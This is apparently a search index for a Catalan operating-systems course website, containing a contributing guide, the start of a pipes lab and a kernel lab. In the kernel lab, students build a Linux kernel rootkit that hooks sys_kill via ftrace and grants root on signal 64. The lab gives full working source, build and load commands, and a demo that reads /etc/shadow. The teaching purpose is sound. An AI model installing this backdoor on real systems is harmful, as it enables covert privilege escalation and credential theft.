    "href": "CONTRIBUTING.html",
    "title": "Contribueix",
    "section": "",
    "text": "Aquest material és de codi obert i podeu col·laborar-hi, complementar-lo o corregir-lo mitjançant pull requests al repositori.\n\n\n\nFork el repositori: Fes clic al botó Fork a la part superior dreta de la pàgina. Això crearà una còpia del repositori al teu compte de GitHub. Veure imatge:\n\n\n\n\nClona el repositori a la teva màquina: Utilitza Git per clonar el repositori que has clonat a la teva màquina.\nCrea una branca (branch) nova: Abans de fer canvis, crea una branca nova on faràs les teves modificacions. Això ajuda a mantenir les coses ordenades. Utilitza la comanda següent:\n\ngit checkout -b nom_de_la_branca\n\nFes els canvis: Realitza les modificacions necessàries en els fitxers del projecte.\nAfegeix i commiteja els canvis: Utilitza els següents comandos per afegir els canvis i fer un commit.\nPuja els canvis al teu repositori a GitHub amb la comanda següent:\n\ngit push origin nom_de_la_branca\n\nCrea una PR: Vés al teu repositori a GitHub i selecciona la branca on has fet els canvis. Apareixerà un missatge destacat dient que has fet una nova branca. Fes clic a “Compare & pull request” per començar la PR.\n\nTambé, pots anar a la nova branca fent click al menu desplegable i seleccionant la branca que has creat 1 i fent click al botó New pull request 2. Veure imatge:\n\n\nProporciona una descripció detallada dels canvis que has fet. A més, pots afegir captures de pantalla o informació addicional per ajudar els revisors a entendre els teus canvis. Fes clic a New pull request i beuras una pantalla com la següent:\n\n\n1 Indica el meu repositori (on vols enviar les modificacions) i 2 indica el teu fork (on has fet les modificacions). Assegura’t de seleccionar la branca amb les modificacions 3. Finalment, fes clic a Create pull request 4.\n\nEnvia la PR: Un cop hagis omplert tota la informació, fes clic al botó “Create pull request” per enviar la PR al projecte original.\n\n\n\n\nPer editar el material:\n\nAl teu ordinador, necessitareu instal·lar Quarto.\nDirectament al navegador, podeu editar els fitxers .qmd fent clic al botó de llapis que apareix a la part superior dreta de cada fitxer. Això crearà una nova branca amb els teus canvis i et permetrà fer una PR directament des del navegador.\n\n\n\nAbans de començar, assegura’t que tens Quarto instal·lat al teu ordinador. Obra un terminal o un IDE com VSCode i navega fins a la carpeta on tens el projecte.\nPer veure una previsualització local del lloc web:\nquarto preview\nAixò obrirà una previsualització local al teu navegador. La previsualització s’actualitza automàticament quan deses els canvis.\n\n\n\nEs pot integrar amb Visual Studio Code (VSCode) per a una millor experiència d’edició. Si no tens VSCode, pots descarregar-lo des de https://code.visualstudio.com/.\n\nQuarto: Edició en mode visual: Permet editar els fitxers .qmd en un mode visual que facilita l’ús de les funcions de Quarto.\nQuarto: Previsualització: Obre una previsualització del fitxer .qmd actual.\nQuarto: Edició en mode font: Torna a l’edició en mode text pla."
  },
  {
    "objectID": "CONTRIBUTING.html#instruccions-per-contribuïr",
    "href": "CONTRIBUTING.html#instruccions-per-contribuïr",
    "title": "Contribueix",
    "section": "",
    "text": "Fork el repositori: Fes clic al botó Fork a la part superior dreta de la pàgina. Això crearà una còpia del repositori al teu compte de GitHub. Veure imatge:\n\n\n\n\nClona el repositori a la teva màquina: Utilitza Git per clonar el repositori que has clonat a la teva màquina.\nCrea una branca (branch) nova: Abans de fer canvis, crea una branca nova on faràs les teves modificacions. Això ajuda a mantenir les coses ordenades. Utilitza la comanda següent:\n\ngit checkout -b nom_de_la_branca\n\nFes els canvis: Realitza les modificacions necessàries en els fitxers del projecte.\nAfegeix i commiteja els canvis: Utilitza els següents comandos per afegir els canvis i fer un commit.\nPuja els canvis al teu repositori a GitHub amb la comanda següent:\n\ngit push origin nom_de_la_branca\n\nCrea una PR: Vés al teu repositori a GitHub i selecciona la branca on has fet els canvis. Apareixerà un missatge destacat dient que has fet una nova branca. Fes clic a “Compare & pull request” per començar la PR.\n\nTambé, pots anar a la nova branca fent click al menu desplegable i seleccionant la branca que has creat 1 i fent click al botó New pull request 2. Veure imatge:\n\n\nProporciona una descripció detallada dels canvis que has fet. A més, pots afegir captures de pantalla o informació addicional per ajudar els revisors a entendre els teus canvis. Fes clic a New pull request i beuras una pantalla com la següent:\n\n\n1 Indica el meu repositori (on vols enviar les modificacions) i 2 indica el teu fork (on has fet les modificacions). Assegura’t de seleccionar la branca amb les modificacions 3. Finalment, fes clic a Create pull request 4.\n\nEnvia la PR: Un cop hagis omplert tota la informació, fes clic al botó “Create pull request” per enviar la PR al projecte original."
  },
  {
    "objectID": "CONTRIBUTING.html#edició-del-material",
    "href": "CONTRIBUTING.html#edició-del-material",
    "title": "Contribueix",
    "section": "",
    "text": "Per editar el material:\n\nAl teu ordinador, necessitareu instal·lar Quarto.\nDirectament al navegador, podeu editar els fitxers .qmd fent clic al botó de llapis que apareix a la part superior dreta de cada fitxer. Això crearà una nova branca amb els teus canvis i et permetrà fer una PR directament des del navegador.\n\n\n\nAbans de començar, assegura’t que tens Quarto instal·lat al teu ordinador. Obra un terminal o un IDE com VSCode i navega fins a la carpeta on tens el projecte.\nPer veure una previsualització local del lloc web:\nquarto preview\nAixò obrirà una previsualització local al teu navegador. La previsualització s’actualitza automàticament quan deses els canvis.\n\n\n\nEs pot integrar amb Visual Studio Code (VSCode) per a una millor experiència d’edició. Si no tens VSCode, pots descarregar-lo des de https://code.visualstudio.com/.\n\nQuarto: Edició en mode visual: Permet editar els fitxers .qmd en un mode visual que facilita l’ús de les funcions de Quarto.\nQuarto: Previsualització: Obre una previsualització del fitxer .qmd actual.\nQuarto: Edició en mode font: Torna a l’edició en mode text pla."
  },
  {
    "objectID": "labs/04-kernel/lab02.html",
    "href": "labs/04-kernel/lab02.html",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "",
    "text": "Màquina virtual amb Debian.\nRealitzar una snapshot de la màquina virtual abans de començar el laboratori.\nProgramari necessari:\n\nEines de construcció de programari: build-essential\nCapçaleres del kernel: linux-headers-$(uname -r)\nAltres eines: libncurses-dev, bison, flex, kmod\nInstal·lació de les eines necessàries:\nsu -c \"apt update && apt upgrade -y\"\nsu -c \"apt install build-essential linux-headers-$(uname -r) libncurses-dev bison flex kmod -y\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 · Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab02.html#requeriments-previs",
    "href": "labs/04-kernel/lab02.html#requeriments-previs",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "",
    "text": "Màquina virtual amb Debian.\nRealitzar una snapshot de la màquina virtual abans de començar el laboratori.\nProgramari necessari:\n\nEines de construcció de programari: build-essential\nCapçaleres del kernel: linux-headers-$(uname -r)\nAltres eines: libncurses-dev, bison, flex, kmod\nInstal·lació de les eines necessàries:\nsu -c \"apt update && apt upgrade -y\"\nsu -c \"apt install build-essential linux-headers-$(uname -r) libncurses-dev bison flex kmod -y\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 · Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab02.html#objectiu",
    "href": "labs/04-kernel/lab02.html#objectiu",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "Objectiu",
    "text": "Objectiu\nL’objectiu d’aquest laboratori és crear un rootkit que intercepti una crida a sistema específica (sys_kill) i permeti una escalada de privilegis. Això es fa mitjançant la implementació d’una funció hook que canvia el comportament de la crida kill quan s’utilitza amb un cert senyal (utilitzarem l’enter 64 ja que és un enter lliure i no es fa servir per cap senyal), permetent l’escalada de privilegis. Aquest exemple s’ha extret de (TheXcellerator).",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 · Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab02.html#procediment",
    "href": "labs/04-kernel/lab02.html#procediment",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "Procediment",
    "text": "Procediment\n\n\n\nEsquema del procediment\n\n\n\nCrida a sistema en mode usuari: Les crides a sistema són operacions crítiques que es fan des del mode usuari. La instrucció SYSCALL permet invocar una crida a sistema que serà gestionada pel nucli.\nGestor específic pren el control: Quan es realitza una crida a sistema des de l’espai d’usuari, el nucli del sistema operatiu pren el control. Aquest es delega a una funció de baix nivell implementada, com ara do_syscall_64(). Aquesta funció accedeix a la taula de controladors de crides al sistema (sys_call_table) i crida un controlador específic basat en el número de crida a sistema.\n**Ftrace i __fentry()**: Al principi de cada funció dins del nucli, s’ubica una crida especial *__fentry()*, que fa part del sistema de traçabilitat Ftrace. Si aquesta funció no ha de ser traçada, se substitueix amb una instrucció nop.\nFtrace crida al nostre callback: Quan s’executa una crida a sistema traçada per Ftrace, el sistema crida al nostre callback específic que hem enganxat (hooked). En aquest callback, podem modificar el valor del registre ip, que apunta a la següent funció que ha d’executar-se.\nRestauració de l’estat dels registres: Ftrace es responsabilitza de restaurar l’estat original dels registres abans de passar el control al controlador original de la crida a sistema. El nostre hook canvia el registre ip per dirigir l’execució a la nostra funció hook, no a la funció original.\nCanvi de control a la nostra funció hook: Aquest canvi de registre ip dirigeix l’execució a la nostra funció hook, però el processador i la memòria romanen en el mateix estat. La nostra funció hook rep els arguments del controlador original.\nExecució de la funció original: La funció hook crida la funció original de la crida a sistema, obtenint així el control de la crida a sistema.\nProcessament del hook: Després d’analitzar el context i els arguments de la crida al sistema, el nostre hook realitza les accions desitjades.\nCallback sense accions: En la segona crida a la funció original de la crida a sistema, que passa a través de Ftrace, el callback no fa cap acció, permetent que la funció original s’executi sense interrupcions.\nTornada a la funció original: La funció original de la crida a sistema s’executa sense interferències, ja que ha estat cridada no pel nucli des de do_syscall_64(), sinó per la nostra funció hook.\nRetorn al gestor de crides del sistema: Després que la funció original ha acabat, el control retorna al gestor de crides del sistema (sys_xxxx()), i de nou a la nostra funció hook (fh_sys_execve()).\nRetorn al mode d’usuari: Finalment, el nucli passa el control al procés de l’usuari, completant el cicle d’execució d’una crida a sistema amb l’ús d’un hook.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 · Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab02.html#implementació",
    "href": "labs/04-kernel/lab02.html#implementació",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "Implementació",
    "text": "Implementació\nL’implementació es basa en modificar la funció de crida a sistema kill per interceptar la crida amb un senyal específic (64 en aquest cas) i, si es detecta aquest senyal, canviar les credencials de l’usuari actual a les credencials d’administrador (root), permetent així l’escalada de privilegis.\n\nCrearem una funció que modifiqui les credencials de l’usuari actual per les credencials d’administrador (root). Aquesta funció utilitza la structura cred per modificar les credencials de l’usuari. Aquesta estructura es troba a include/linux/cred.h. prepare_creds() crea una nova estructura de credencials i l’assigna a la variable root. Per representar l’usuari root necessitem editar els valors uid,gid,egid,sgid,fsgid al valors 0 que en sistemes linux es reserva per l’usuari root. Finalment, commit_creds() aplica les credencials a l’usuari actual.\nvoid set_root(void)\n{\n    struct cred *root;\n    root = prepare_creds();\n    if (root == NULL)\n        return;\n    root-&gt;uid.val = \n        root-&gt;gid.val = 0;\n    root-&gt;euid.val = \n        root-&gt;egid.val = 0;\n    root-&gt;suid.val = \n        root-&gt;sgid.val = 0;\n    root-&gt;fsuid.val = \n        root-&gt;fsgid.val = 0;\n    commit_creds(root);\n}\nUn cop implementada la funció per esdevenir root, necessitem implementar un hook (rutina de tractament de la senyal 64). En aquest cas, el nostre hook interceptarà la crida a sistema kill i, si el senyal és 64, cridarà a la funció set_root() per esdevenir root. Per obtenir el nº de senyal utilitzarem la variable si de la structura pt_regs. Aquesta estructura conté informació sobre els registres del processador en el moment de la crida a sistema i ens permet obtenir informació com el nº de senyal, el PID, etc.\nasmlinkage int hook_kill(\n    const struct pt_regs *regs)\n{\n    void set_root(void);\n    int sig = regs-&gt;si;\n    if (sig == 64)\n    {\n        printk(KERN_INFO \"rootkit: giving root...\\n\");\n        set_root();\n        return 0;\n    }\n    return orig_kill(regs);\n}\nImplementarem un mòdul del kernel que utiltizi aquestes funcions i ens permeti instal·lar/desintal·lar el nostre rootkit al sistema.\n    #include &lt;linux/init.h&gt;\n    #include &lt;linux/module.h&gt;\n    #include &lt;linux/kernel.h&gt;\n    #include &lt;linux/syscalls.h&gt;\n    #include &lt;linux/kallsyms.h&gt;\n    #include &lt;linux/version.h&gt;\n\n    #include \"ftrace_helper.h\"\n\n    MODULE_LICENSE(\"GPL\");\n    MODULE_AUTHOR(\"Jordi Mateo\");\n    MODULE_DESCRIPTION(\"\");\n    MODULE_VERSION(\"0.01\");\n\n    /* After Kernel 4.17.0, the way that syscalls are handled changed\n    * to use the pt_regs struct instead of the more familiar function\n    * prototype declaration. We have to check for this, and set a\n    * variable for later on */\n    #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(4,17,0))\n    #define PTREGS_SYSCALL_STUBS 1\n    #endif\n\n    /* We now have to check for the PTREGS_SYSCALL_STUBS flag and\n    * declare the orig_kill and hook_kill functions differently\n    * depending on the kernel version. This is the largest barrier to \n    * getting the rootkit to work on earlier kernel versions. The\n    * more modern way is to use the pt_regs struct. */\n    #ifdef PTREGS_SYSCALL_STUBS\n    static asmlinkage long (*orig_kill)(const struct pt_regs *);\n\n    /* We can only modify our own privileges, and not that of another\n    * process. Just have to wait for signal 64 (normally unused) \n    * and then call the set_root() function. */\n    asmlinkage int hook_kill(const struct pt_regs *regs)\n    {\n        void set_root(void);\n\n        // pid_t pid = regs-&gt;di;\n        int sig = regs-&gt;si;\n\n        if ( sig == 64 )\n        {\n            printk(KERN_INFO \"rootkit: giving root...\\n\");\n            set_root();\n            return 0;\n        }\n\n        return orig_kill(regs);\n\n    }\n    #else\n    /* This is the old way of declaring a syscall hook */\n\n    static asmlinkage long (*orig_kill)(pid_t pid, int sig);\n\n    static asmlinkage int hook_kill(pid_t pid, int sig)\n    {\n        void set_root(void);\n\n        if ( sig == 64 )\n        {\n            printk(KERN_INFO \"rootkit: giving root...\\n\");\n            set_root();\n            return 0;\n        }\n\n        return orig_kill(pid, sig);\n    }\n    #endif\n\n    /* Whatever calls this function will have it's creds struct replaced\n    * with root's */\n    void set_root(void)\n    {\n        /* prepare_creds returns the current credentials of the process */\n        struct cred *root;\n        root = prepare_creds();\n\n        if (root == NULL)\n            return;\n\n        /* Run through and set all the various *id's to 0 (root) */\n        root-&gt;uid.val = root-&gt;gid.val = 0;\n        root-&gt;euid.val = root-&gt;egid.val = 0;\n        root-&gt;suid.val = root-&gt;sgid.val = 0;\n        root-&gt;fsuid.val = root-&gt;fsgid.val = 0;\n\n        /* Set the cred struct that we've modified to that of the calling process */\n        commit_creds(root);\n    }\n\n    /* Declare the struct that ftrace needs to hook the syscall */\n    static struct ftrace_hook hooks[] = {\n        HOOK(\"__x64_sys_kill\", hook_kill, &orig_kill),\n    };\n\n    /* Module initialization function */\n    static int __init rootkit_init(void)\n    {\n        /* Hook the syscall and print to the kernel buffer */\n        int err;\n        err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));\n        if(err)\n            return err;\n\n        printk(KERN_INFO \"rootkit: Loaded &gt;:-)\\n\");\n\n        return 0;\n    }\n\n    static void __exit rootkit_exit(void)\n    {\n        /* Unhook and restore the syscall and print to the kernel buffer */\n        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));\n        printk(KERN_INFO \"rootkit: Unloaded :-(\\n\");\n    }\n\n    module_init(rootkit_init);\n    module_exit(rootkit_exit);\nFinalment implementar el fitxer ftrace_helper.h que conté les funcions auxiliars per a la implementació del rootkit. La macro HOOK obtindrà l’adreça original on tenim implementada la funcionalitat real de la crida a sistema i la modificarà (hook) per tenir en aquella adreça la nostra funcionalitat maliciosa.\n    /*\n    * Helper library for ftrace hooking kernel functions\n    * Author: Harvey Phillips (xcellerator@gmx.com)\n    * License: GPL\n    * */\n\n    #include &lt;linux/ftrace.h&gt;\n    #include &lt;linux/linkage.h&gt;\n    #include &lt;linux/slab.h&gt;\n    #include &lt;linux/uaccess.h&gt;\n    #include &lt;linux/version.h&gt;\n\n    #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(4,17,0))\n    #define PTREGS_SYSCALL_STUBS 1\n    #endif\n\n    /*\n    * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, \n    * so we have to use kprobes to get the address.\n    * Full credit to @f0lg0 for the idea.\n    */\n    #if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5,7,0)\n    #define KPROBE_LOOKUP 1\n    #include &lt;linux/kprobes.h&gt;\n    static struct kprobe kp = {\n        .symbol_name = \"kallsyms_lookup_name\"\n    };\n    #endif\n\n    #define HOOK(_name, _hook, _orig)   \\\n    {                   \\\n        .name = (_name),        \\\n        .function = (_hook),        \\\n        .original = (_orig),        \\\n    }\n\n    /* We need to prevent recursive loops when hooking, otherwise the kernel will\n    * panic and hang. The options are to either detect recursion by looking at\n    * the function return address, or by jumping over the ftrace call. We use the \n    * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by\n    * setting it to 1. (Oridinarily ftrace provides it's own protections against\n    * recursion, but it relies on saving return registers in $rip. We will likely\n    * need the use of the $rip register in our hook, so we have to disable this\n    * protection and implement our own).\n    * */\n    #define USE_FENTRY_OFFSET 0\n    #if !USE_FENTRY_OFFSET\n    #pragma GCC optimize(\"-fno-optimize-sibling-calls\")\n    #endif\n\n    /* We pack all the information we need (name, hooking function, original function)\n    * into this struct. This makes is easier for setting up the hook and just passing\n    * the entire struct off to fh_install_hook() later on.\n    * */\n    struct ftrace_hook {\n        const char *name;\n        void *function;\n        void *original;\n\n        unsigned long address;\n        struct ftrace_ops ops;\n    };\n\n    /* Ftrace needs to know the address of the original function that we\n    * are going to hook. As before, we just use kallsyms_lookup_name() \n    * to find the address in kernel memory.\n    * */\n    static int fh_resolve_hook_address(struct ftrace_hook *hook)\n    {\n    #ifdef KPROBE_LOOKUP\n        typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n        kallsyms_lookup_name_t kallsyms_lookup_name;\n        register_kprobe(&kp);\n        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n        unregister_kprobe(&kp);\n    #endif\n        hook-&gt;address = kallsyms_lookup_name(hook-&gt;name);\n\n        if (!hook-&gt;address)\n        {\n            printk(KERN_DEBUG \"rootkit: unresolved symbol: %s\\n\", hook-&gt;name);\n            return -ENOENT;\n        }\n\n    #if USE_FENTRY_OFFSET\n        *((unsigned long*) hook-&gt;original) = hook-&gt;address + MCOUNT_INSN_SIZE;\n    #else\n        *((unsigned long*) hook-&gt;original) = hook-&gt;address;\n    #endif\n\n        return 0;\n    }\n\n    /* See comment below within fh_install_hook() */\n    static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)\n    {\n        struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);\n\n    #if USE_FENTRY_OFFSET\n        regs-&gt;ip = (unsigned long) hook-&gt;function;\n    #else\n        if(!within_module(parent_ip, THIS_MODULE))\n            regs-&gt;ip = (unsigned long) hook-&gt;function;\n    #endif\n    }\n\n    /* Assuming we've already set hook-&gt;name, hook-&gt;function and hook-&gt;original, we \n    * can go ahead and install the hook with ftrace. This is done by setting the \n    * ops field of hook (see the comment below for more details), and then using\n    * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions\n    * provided by ftrace.h\n    * */\n    int fh_install_hook(struct ftrace_hook *hook)\n    {\n        int err;\n        err = fh_resolve_hook_address(hook);\n        if(err)\n            return err;\n\n        /* For many of function hooks (especially non-trivial ones), the $rip\n        * register gets modified, so we have to alert ftrace to this fact. This\n        * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also\n        * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because\n        * the built-in anti-recursion guard provided by ftrace is useless if\n        * we're modifying $rip. This is why we have to implement our own checks\n        * (see USE_FENTRY_OFFSET). */\n        hook-&gt;ops.func = (ftrace_func_t)fh_ftrace_thunk;\n        hook-&gt;ops.flags = FTRACE_OPS_FL_SAVE_REGS\n                | FTRACE_OPS_FL_RECURSION\n                | FTRACE_OPS_FL_IPMODIFY;\n\n        err = ftrace_set_filter_ip(&hook-&gt;ops, hook-&gt;address, 0, 0);\n        if(err)\n        {\n            printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n            return err;\n        }\n\n        err = register_ftrace_function(&hook-&gt;ops);\n        if(err)\n        {\n            printk(KERN_DEBUG \"rootkit: register_ftrace_function() failed: %d\\n\", err);\n            return err;\n        }\n\n        return 0;\n    }\n\n    /* Disabling our function hook is just a simple matter of calling the built-in\n    * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the\n    * opposite order to that in fh_install_hook()).\n    * */\n    void fh_remove_hook(struct ftrace_hook *hook)\n    {\n        int err;\n        err = unregister_ftrace_function(&hook-&gt;ops);\n        if(err)\n        {\n            printk(KERN_DEBUG \"rootkit: unregister_ftrace_function() failed: %d\\n\", err);\n        }\n\n        err = ftrace_set_filter_ip(&hook-&gt;ops, hook-&gt;address, 1, 0);\n        if(err)\n        {\n            printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n        }\n    }\n\n    /* To make it easier to hook multiple functions in one module, this provides\n    * a simple loop over an array of ftrace_hook struct\n    * */\n    int fh_install_hooks(struct ftrace_hook *hooks, size_t count)\n    {\n        int err;\n        size_t i;\n\n        for (i = 0 ; i &lt; count ; i++)\n        {\n            err = fh_install_hook(&hooks[i]);\n            if(err)\n                goto error;\n        }\n        return 0;\n\n    error:\n        while (i != 0)\n        {\n            fh_remove_hook(&hooks[--i]);\n        }\n        return err;\n    }\n\n    void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)\n    {\n        size_t i;\n\n        for (i = 0 ; i &lt; count ; i++)\n            fh_remove_hook(&hooks[i]);\n    }\nAquesta implementació es basa en la implementació de ftrace. Ftrace és una eina de depuració que permet monitoritzar les crides a sistema. Per a més informació sobre ftrace podeu consultar aquest enllaç. Registra la informació relacionada amb les crides a sistema i ens permet definir callbacks, entre altres funcions. Ens permet intervenir quan el registre ’‘’rip’’’contingui una adreça de memòria. Si establim que aquesta adreça és on comença la funcionalitat d’una crida a sistema, podem modificar perquè s’executi una altra funcionalitat.\nstruct ftrace_hook {\n    const char *name;\n    void *function;\n    void *original;\n    unsigned long address;\n    struct ftrace_ops ops;\n};\nLa part més important de hook és la callback. Aquesta funció està assignant al registre IP (següent instrucció a executar pel processador) a l’adreça hook-&gt;function.\nstatic void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, \n    struct ftrace_ops *ops, struct pt_regs *regs)\n{\n    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);\n    #if USE_FENTRY_OFFSET\n        regs-&gt;ip = (unsigned long) hook-&gt;function;\n    #else\n        if(!within_module(parent_ip, THIS_MODULE))\n            regs-&gt;ip = (unsigned long) hook-&gt;function;\n    #endif\n}\nnotrace és un tractament especial per marcar funcions prohibides per a fer seguiment amb ptrace. Es poden marcar funcions que s’utilitzen en el procés de seguiment. Evitem que el sistema es pengi si cridem de forma errònia a la vostra callback.\nTambé és molt important la funció fh_resolve_hook_address(). Aquesta funció utilitza kallsyms_lookup_name() (linux/kallsyms.h&gt;) per cercar l’adreça de la crida a sistema real. Aquest valor s’emprarà tant per obtenir el codi original i guardar-lo en una altra adreça com per sobreescriu amb el nostre rootkit. Es guarda en l’atribut address.\n    static int fh_resolve_hook_address(struct ftrace_hook *hook)\n    {\n    #ifdef KPROBE_LOOKUP\n        typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n        kallsyms_lookup_name_t kallsyms_lookup_name;\n        register_kprobe(&kp);\n        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n        unregister_kprobe(&kp);\n    #endif\n        hook-&gt;address = kallsyms_lookup_name(hook-&gt;name);\n\n        if (!hook-&gt;address)\n        {\n            printk(KERN_DEBUG \"rootkit: unresolved symbol: %s\\n\", hook-&gt;name);\n            return -ENOENT;\n        }\n    }\nOBSERVACIÓ: Quan intentem fer hook, es poden donar bucles recursius. Per evitar-ho tenim diferents opcions. Podem intenta detectar la recursivitat mirant l’adreça de retorn de la funció o bé podem saltar a una adreça per sobre la crida ftrace.\n    #if USE_FENTRY_OFFSET\n        *((unsigned long*) hook-&gt;original) = hook-&gt;address + MCOUNT_INSN_SIZE;\n    #else\n        *((unsigned long*) hook-&gt;original) = hook-&gt;address;\n    #endif\nFinalment, no ens podem oblidar de comentar els flags que s’utilitzen per definir la callback:\n\nFTRACE_OPS_FL_SAVE_REGS: Flag que permet passar pt_regs de la crida original al nostre hook.\nFTRACE_OPS_FL_IP_MODIFY: Indiquem a ftrace que modificarem el registre IP.\nFTRACE_OPS_FL_RECURSION: Desactivar la protecció per defecte de ftrace.\n\n    hook-&gt;ops.func = (ftrace_func_t)fh_ftrace_thunk;\n    hook-&gt;ops.flags = FTRACE_OPS_FL_SAVE_REGS\n                | FTRACE_OPS_FL_RECURSION\n                | FTRACE_OPS_FL_IPMODIFY;\nBàsicament aquestes funcions ens permet instal·lar/desinstal·lar hooks a crides a sistema.\n\nftrace_set_filter_ip() diu a ftrace que només executi la nostra callback quan rip és l’adreça de sys_open (desada a hook-&gt;address).\nregister_ftrace_function(). Asegura que tot estigui al seu lloc i l’hook preparat.\n\n    err = ftrace_set_filter_ip(&hook-&gt;ops, hook-&gt;address, 0, 0);\n    if(err)\n    {\n        printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n        return err;\n    }\n    err = register_ftrace_function(&hook-&gt;ops);\n    if(err)\n    {\n        printk(KERN_DEBUG \"rootkit: register_ftrace_function() failed: %d\\n\", err);\n        return err;\n    }\n\nDesfem el procés anterior:\n\nvoid fh_remove_hook(struct ftrace_hook *hook)\n{\n    int err;\n    err = unregister_ftrace_function(&hook-&gt;ops);\n    if(err)\n    {\n        printk(KERN_DEBUG \"rootkit: unregister_ftrace_function() failed: %d\\n\", err);\n    }\n\n    err = ftrace_set_filter_ip(&hook-&gt;ops, hook-&gt;address, 1, 0);\n    if(err)\n    {\n        printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n    }\n}\nPreparem un Makefile per compilar el nostre mòdul del kernel:\nobj-m += rootkit.o\n\nall:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\nCompilem el nostre mòdul del kernel:\nmake\nInstal·lem el nostre mòdul del kernel:\ninsmod rootkit.ko\nComprovem que el nostre mòdul s’ha instal·lat correctament:\nlsmod | grep rootkit\nComprovem que el nostre rootkit funciona correctament:\ndmesg | tail\nCrearem un usuari al sistema sense privilegis d’administrador:\nuseradd test\nEns connectem al sistema amb aquest usuari:\nsu - test\nObservem els valors que identifiquen l’usuari actual:\nid\nIntenteu revisar un fitxer que només pot ser llegit pel root (/etc/shadow):\ncat /etc/shadow\nActivem el nostre backdoor:\nsleep 120 &\nObtenim el id del procés sleep:\nps | grep sleep\nEnviem la senyal:\nkill -64 20005\nComprovem que ara tenim privilegis d’administrador:\nid\nComprovem que ara podem llegir el fitxer /etc/shadow:\ncat /etc/shadow\nDesinstal·lem el nostre mòdul del kernel:\nrmmod rootkit",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 · Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/05-procs/lab02.html",
    "href": "labs/05-procs/lab02.html",
    "title": "Escape Room entre processos amb Pipes",
    "section": "",
    "text": "Crear i gestionar processos fills amb fork().\nComunicar processos amb pipes i FIFOs.\nUtilitzar senyals (SIGALRM, SIGUSR1).\nSincronitzar i finalitzar processos.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 12 · Escape Room amb processos i pipes"
    ]
  },
  {
    "objectID": "labs/05-procs/lab02.html#objectius",
    "href": "labs/05-procs/lab02.html#objectius",
    "title": "Escape Room entre processos amb Pipes",
    "section": "",
    "text": "Crear i gestionar processos fills amb fork().\nComunicar processos amb pipes i FIFOs.\nUtilitzar senyals (SIGALRM, SIGUSR1).\nSincronitzar i finalitzar processos.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 12 · Escape Room amb processos i pipes"
    ]
  },
  {
    "objectID": "labs/05-procs/lab02.html#descripció",
    "href": "labs/05-procs/lab02.html#descripció",
    "title": "Escape Room entre processos amb Pipes",
    "section": "🏗️ Descripció",
    "text": "🏗️ Descripció\nEn aquest laboratori us proposem implementar un joc senzill d’Escape Room utilitzant processos i comunicació entre ells mitjançant pipes. Per fer-ho, haureu de crear un procés pare que gestioni la partida i diversos processos fills que representin els jugadors. La idea és que els jugadors intentin endevinar una clau secreta abans que s’acabi el temps.\n\nPer simplificar, la clau serà una cadena de 4 caràcters (per exemple, ABCD) i els jugadors generaran combinacions aleatòries fins a trobar la correcta o que s’acabi el temps.\nEl programa acceptarà tres arguments:\n\nTemps màxim per a la partida (en segons).\nNombre de jugadors (processos fills).\nClau secreta (cadena de 4 caràcters).\n\nEl programa finalitzarà quan un jugador encerti la clau o quan s’acabi el temps.\n\nEls jugadors acertaran la clau enviant-la al procés pare mitjançant un pipe i guanyaran si ho aconsegueixen abans que s’acabi el temps.\n\nSi el temps s’esgota, el procés pare enviarà un senyal als processos fills per indicar que la partida ha acabat.\n\n\nA més, implementarem la lògica del jugador i del sala (pare) en fitxers separats. El pare (sala.c) esperarà la finalització dels seus fills (jugador.c) per acabar la partida.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 12 · Escape Room amb processos i pipes"
    ]
  },
  {
    "objectID": "labs/05-procs/lab02.html#jugador.c",
    "href": "labs/05-procs/lab02.html#jugador.c",
    "title": "Escape Room entre processos amb Pipes",
